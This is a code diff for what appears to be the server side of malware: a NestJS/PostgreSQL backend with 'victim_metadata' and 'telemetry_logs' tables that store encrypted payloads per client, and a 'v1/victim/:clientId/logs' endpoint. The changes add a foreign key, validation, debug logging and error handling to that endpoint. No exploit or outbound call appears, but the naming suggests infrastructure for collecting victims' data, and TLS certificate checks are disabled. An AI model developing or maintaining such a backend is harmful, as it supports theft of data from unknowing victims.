@@ -460,7 +460,7 @@ CREATE INDEX IF NOT EXISTS idx_victim_metadata_last_updated ON victim_metadata(l
         await db.query(`
 CREATE TABLE IF NOT EXISTS telemetry_logs (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-  client_id UUID NOT NULL,
+  client_id UUID NOT NULL REFERENCES telemetry_clients(id) ON DELETE CASCADE,
   timestamp TIMESTAMPTZ,
   encrypted_payload BYTEA,
   payload_size INTEGER DEFAULT 0,
@@ -604,48 +604,106 @@ CREATE INDEX IF NOT EXISTS idx_telemetry_logs_received_at ON telemetry_logs(rece
 
   @Get('v1/victim/:clientId/logs')
   async getVictimLogs(@Param('clientId') clientId: string) {
+    console.log('=== getVictimLogs START ===');
+    console.log('clientId:', clientId);
+    console.log('clientId type:', typeof clientId);
+    console.log('clientId length:', clientId?.length);
+    
+    // Валидация clientId
+    if (!clientId || clientId.trim().length === 0) {
+      console.log('❌ ERROR: Empty clientId');
+      return {
+        success: false,
+        error: 'Invalid client_id',
+        client_id: clientId,
+        logs: [],
+        count: 0,
+      };
+    }
+    
+    const db = new Client({
+      connectionString: process.env.DATABASE_URL,
+      ssl: { rejectUnauthorized: false },
+    });
+
     try {
-      const db = new Client({
-        connectionString: process.env.DATABASE_URL,
-        ssl: { rejectUnauthorized: false },
-      });
-      
       await db.connect();
-      try {
-        const result = await db.query(`
-          SELECT 
-            id,
-            client_id,
-            timestamp,
-            payload_size,
-            received_at
-          FROM telemetry_logs
-          WHERE client_id = $1
-          ORDER BY received_at DESC
-          LIMIT 100
-        `, [clientId]);
-        
+      console.log('✅ Database connected for getVictimLogs');
+      
+      // Проверяем существование таблицы
+      const tableCheck = await db.query(`
+        SELECT EXISTS (
+          SELECT FROM information_schema.tables 
+          WHERE table_schema = 'public' 
+          AND table_name = 'telemetry_logs'
+        );
+      `);
+      
+      if (!tableCheck.rows[0]?.exists) {
+        console.log('⚠️ Table telemetry_logs does not exist');
         return {
           success: true,
           client_id: clientId,
-          logs: result.rows.map(log => ({
-            id: log.id,
-            client_id: log.client_id,
-            data_type: 'encrypted',
-            received_at: log.received_at,
-            decrypted_data: {}
-          })),
-          count: result.rows.length,
+          logs: [],
+          count: 0,
+          message: 'Table telemetry_logs does not exist yet',
         };
-      } finally {
-        await db.end();
       }
+      
+      console.log('✅ Table telemetry_logs exists, executing query...');
+      
+      const result = await db.query(`
+        SELECT 
+          id,
+          client_id,
+          timestamp,
+          payload_size,
+          received_at
+        FROM telemetry_logs
+        WHERE client_id = $1
+        ORDER BY received_at DESC
+        LIMIT 100
+      `, [clientId]);
+      
+      console.log(`✅ Found ${result.rows.length} logs for client ${clientId}`);
+      
+      return {
+        success: true,
+        client_id: clientId,
+        logs: result.rows.map(log => ({
+          id: log.id,
+          client_id: log.client_id,
+          timestamp: log.timestamp,
+          payload_size: log.payload_size,
+          data_type: 'encrypted',
+          received_at: log.received_at,
+          decrypted_data: {}
+        })),
+        count: result.rows.length,
+      };
     } catch (error) {
-      console.error('Error fetching victim logs:', error);
+      console.error('❌ ERROR in getVictimLogs:', error);
+      console.error('Error name:', error.name);
+      console.error('Error message:', error.message);
+      console.error('Error code:', error.code);
+      console.error('Error detail:', error.detail);
+      console.error('Error stack:', error.stack);
+      
+      // Возвращаем ошибку в правильном формате
       return {
         success: false,
-        error: error.message,
+        error: error.message || 'Internal server error',
+        client_id: clientId,
+        logs: [],
+        count: 0,
       };
+    } finally {
+      try {
+        await db.end();
+        console.log('✅ Database connection closed');
+      } catch (closeError) {
+        console.error('⚠️ Error closing database connection:', closeError.message);
+      }
     }
   }
 }
